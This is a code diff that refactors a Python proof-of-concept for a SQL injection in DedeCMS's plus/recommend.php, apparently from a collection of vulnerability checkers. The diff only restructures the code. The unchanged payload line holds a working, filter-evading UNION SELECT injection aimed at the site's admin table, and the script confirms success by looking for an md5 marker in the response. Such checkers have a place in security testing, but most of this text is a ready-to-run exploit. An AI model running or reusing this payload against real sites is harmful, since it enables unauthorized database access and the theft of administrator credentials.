@@ -12,20 +12,13 @@ description: 1.首先执行到plus/recommand.php，包含了include/common.inc.p
 import sys
 import requests
 import warnings
-
-
-
-class recommend_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['dedecms recommend.php SQL注入', '', '']
         headers = {
             "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
         }
         payload = "/plus/recommend.php?aid=1&_FILES[type][name]&_FILES[type][size]&_FILES[type][type]&_FILES[type][tmp_name]=aa%5c%27AnD+ChAr(@`%27`)+/*!50000Union*/+/*!50000SeLect*/+1,2,3,md5(1234),5,6,7,8,9%20FrOm%20`%23@__admin`%23"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
@@ -40,5 +33,4 @@ class recommend_sqli:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = recommend_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
